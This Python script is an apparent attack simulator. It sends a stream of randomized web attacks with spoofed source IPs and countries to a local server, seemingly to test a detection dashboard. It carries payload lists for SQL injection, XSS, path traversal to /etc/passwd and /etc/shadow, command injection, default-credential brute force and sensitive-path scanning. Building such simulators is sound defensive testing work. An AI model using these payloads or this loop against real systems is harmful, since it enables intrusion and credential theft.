import requests
import random
import time

BASE_URL = "http://127.0.0.1:5000"

# Fake IP pool with country and coordinates
FAKE_IPS = [
    {"ip": "45.83.12.10", "country": "Germany", "lat": 51.1657, "lon": 10.4515},
    {"ip": "103.21.244.1", "country": "India", "lat": 20.5937, "lon": 78.9629},
    {"ip": "185.199.110.153", "country": "United States", "lat": 37.0902, "lon": -95.7129},
    {"ip": "77.88.55.22", "country": "Russia", "lat": 61.5240, "lon": 105.3188},
    {"ip": "201.45.67.89", "country": "Brazil", "lat": -14.2350, "lon": -51.9253},
    {"ip": "8.8.8.8", "country": "United States", "lat": 37.0902, "lon": -95.7129},
    {"ip": "1.1.1.1", "country": "Australia", "lat": -25.2744, "lon": 133.7751},
    {"ip": "91.198.174.192", "country": "Netherlands", "lat": 52.1326, "lon": 5.2913},
    {"ip": "212.58.246.50", "country": "United Kingdom", "lat": 55.3781, "lon": -3.4360},
    {"ip": "103.253.145.10", "country": "Japan", "lat": 36.2048, "lon": 138.2529},
    {"ip": "45.33.32.156", "country": "Canada", "lat": 56.1304, "lon": -106.3468},
    {"ip": "185.143.172.9", "country": "France", "lat": 46.2276, "lon": 2.2137},
    {"ip": "91.234.56.78", "country": "Ukraine", "lat": 48.3794, "lon": 31.1656},
    {"ip": "78.46.101.5", "country": "Germany", "lat": 51.1657, "lon": 10.4515},
    {"ip": "82.102.21.33", "country": "Italy", "lat": 41.8719, "lon": 12.5674},
    {"ip": "177.54.32.11", "country": "Brazil", "lat": -14.2350, "lon": -51.9253},
    {"ip": "124.124.95.1", "country": "India", "lat": 20.5937, "lon": 78.9629},
    {"ip": "95.211.247.35", "country": "Netherlands", "lat": 52.1326, "lon": 5.2913},
    {"ip": "186.202.153.17", "country": "Mexico", "lat": 23.6345, "lon": -102.5528},
    {"ip": "41.86.178.1", "country": "South Africa", "lat": -30.5595, "lon": 22.9375},
]

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1' AND '1'='1",
    "1' OR '1'='1' LIMIT 1--",
    "' OR ''='",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' OR 1=1--",
    "admin'--",
    "' OR 'x'='x",
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert('x')</script>",
    "'-alert(1)-'",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "javascript:alert(1)",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<svg><animate onbegin=alert(1) attributeName=x>",
]

# Path traversal payloads
TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/proc/self/environ",
]

# Command injection payloads
CMD_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "`ls -la`",
    "$(ls -la)",
    "; cat /etc/passwd",
    "| whoami",
    "; id",
    "&& whoami",
    "|| whoami",
]

# Brute force credentials
BRUTE_FORCE_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "12345"),
    ("root", "toor"),
    ("root", "root"),
    ("root", "password"),
    ("user", "user"),
    ("user", "password"),
    ("admin", "pass"),
    ("admin", "1234"),
    ("admin", "admin123"),
    ("root", "123456"),
    ("test", "test"),
    ("guest", "guest"),
]

# Scanner paths
SCANNER_PATHS = [
    "/admin",
    "/wp-admin",
    "/phpmyadmin",
    "/phpMyAdmin",
    "/mysql",
    "/.env",
    "/.git/config",
    "/config",
    "/settings",
    "/api",
    "/backup",
    "/db",
    "/logs",
    "/upload",
    "/uploads",
    "/admin.php",
    "/login.php",
    "/wp-login.php",
    "/administrator",
    "/manager",
]

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.88.1",
    "sqlmap/1.7.2",
    "nikto/2.1.6",
    "python-requests/2.32.5",
    "wget/1.21.3",
    "Go-http-client/1.1",
    "Expanse, a Palo Alto Networks product",
    "Palo Alto Networks",
    "Mozilla/5.0",
]

def random_ip_data():
    return random.choice(FAKE_IPS)

def generate_sql_injection(path):
    """Generate SQL injection attack"""
    payload = random.choice(SQLI_PAYLOADS)
    return (path, {"username": payload, "password": "test"})

def generate_xss_attack(path):
    """Generate XSS attack"""
    payload = random.choice(XSS_PAYLOADS)
    return (path, {"q": payload})

def generate_traversal_attack(path):
    """Generate path traversal attack"""
    payload = random.choice(TRAVERSAL_PAYLOADS)
    return (path, {"file": payload})

def generate_brute_force(path=None):
    """Generate brute force attack"""
    creds = random.choice(BRUTE_FORCE_CREDS)
    return ("/login", {"username": creds[0], "password": creds[1]})

def generate_command_injection():
    """Generate command injection"""
    payload = random.choice(CMD_PAYLOADS)
    return ("/shell", {"cmd": payload})

def generate_scanner_probe():
    """Generate scanner probe"""
    path = random.choice(SCANNER_PATHS)
    return (path, None)

def generate_random_attack():
    """Generate a completely random attack from any category"""
    attack_types = [
        generate_sql_injection,
        generate_xss_attack,
        generate_traversal_attack,
        generate_brute_force,
    ]
    
    # 40% chance for scanner probe, 60% for other attacks
    if random.random() < 0.4:
        return generate_scanner_probe()
    
    attack_generator = random.choice(attack_types)
    return attack_generator(random.choice(["/admin", "/login", "/search", "/query", "/file"]))

def send_attack():
    """Send a randomized attack"""
    # Generate random attack
    path, data = generate_random_attack()
    url = BASE_URL + path
    
    # Random IP data
    ip_data = random_ip_data()
    
    # Random headers
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": ip_data["ip"],
        "X-Real-IP": ip_data["ip"],
        "X-Country": ip_data["country"],
        "X-Lat": str(ip_data["lat"]),
        "X-Lon": str(ip_data["lon"]),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        if data:
            r = requests.post(url, data=data, headers=headers, timeout=3)
        else:
            r = requests.get(url, headers=headers, timeout=3)

        print(f"[+] {random.choice(['🔥','⚡','💀','🎯','🚨'])} {path} from {ip_data['ip']} ({ip_data['country']}) -> {r.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("🔥 Attack simulator started. Sending RANDOMIZED attacks from various countries...")
    print(f"📍 Countries: {', '.join(set(i['country'] for i in FAKE_IPS))}")
    print(f"🎯 Attack types: SQLi, XSS, Traversal, BruteForce, Scanner")
    print()
    while True:
        send_attack()
        # Random delay between attacks (0.1 to 3 seconds)
        time.sleep(random.uniform(0.1, 3.0))

